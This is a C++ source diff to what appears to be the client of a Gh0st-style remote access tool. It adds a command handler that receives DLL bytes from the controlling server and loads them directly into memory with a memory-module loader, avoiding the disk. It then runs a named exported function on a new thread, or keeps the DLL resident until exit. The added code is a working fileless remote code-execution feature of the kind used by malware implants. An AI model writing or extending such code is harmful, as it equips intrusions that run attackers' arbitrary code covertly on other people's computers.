@@ -9,6 +9,7 @@
 #include <fstream>
 #include <corecrt_io.h>
 #include "ClientDll.h"
+#include "MemoryModule.h"
 
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
@@ -110,22 +111,74 @@ BOOL WriteBinaryToFile(const char* data, ULONGLONG size)
 	return TRUE;
 }
 
+typedef struct DllExecParam
+{
+	State& exit;
+	DllExecuteInfo info;
+	BYTE* buffer;
+	DllExecParam(const DllExecuteInfo* dll, BYTE* data, State& status) : exit(status) {
+		memcpy(&info, dll, sizeof(DllExecuteInfo));
+		buffer = new BYTE[info.Size];
+		memcpy(buffer, data, info.Size);
+	}
+	~DllExecParam() {
+		SAFE_DELETE_ARRAY(buffer);
+	}
+}DllExecParam;
+
+DWORD WINAPI ExecuteDLLProc(LPVOID param) {
+	DllExecParam* dll = (DllExecParam*)param;
+	HMEMORYMODULE module = MemoryLoadLibrary(dll->buffer, dll->info.Size);
+	if (module) {
+		DllExecuteInfo info = dll->info;
+		if (info.Func[0]) {
+			FARPROC proc = MemoryGetProcAddress(module, info.Func);
+			if (proc) {
+				switch (info.CallType)
+				{
+				case CALLTYPE_DEFAULT:
+					((CallTypeDefault)proc)();
+					break;
+				default:
+					break;
+				}
+			}
+		}
+		else { // 没有指明函数则只加载DLL
+			while (S_CLIENT_EXIT != dll->exit) {
+				Sleep(1000);
+			}
+		}
+		MemoryFreeLibrary(module);
+	}
+	SAFE_DELETE(dll);
+	return 0x20250529;
+}
+
 VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
 	bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
-	if ((m_ulThreadCount = GetAvailableIndex()) == -1) {
-		if (!isExit) {
-			Mprintf("CKernelManager: The number of threads exceeds the limit.\n");
-			return;
-		}
-	}
-	else if (!isExit){
+	if ((m_ulThreadCount = GetAvailableIndex()) == -1 && !isExit) {
+		return Mprintf("CKernelManager: The number of threads exceeds the limit.\n");
+	} else if (!isExit){
 		m_hThread[m_ulThreadCount].p = nullptr;
 		m_hThread[m_ulThreadCount].conn = m_conn;
 	}
 
 	switch(szBuffer[0])
 	{
+	case CMD_EXECUTE_DLL: {
+#ifdef _WIN64
+		const int sz = 1 + sizeof(DllExecuteInfo);
+		if (ulLength <= sz)break;
+		DllExecuteInfo* info = (DllExecuteInfo*)(szBuffer + 1);
+		if (info->Size == ulLength - sz)
+			CloseHandle(CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(info, szBuffer + sz, g_bExit), 0, NULL));
+		Mprintf("Execute '%s'%s succeed: %d Length: %d\n", info->Name, info->Func, szBuffer[1], info->Size);
+#endif
+		break;
+	}
+
 	case COMMAND_PROXY: {
 		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
 		m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
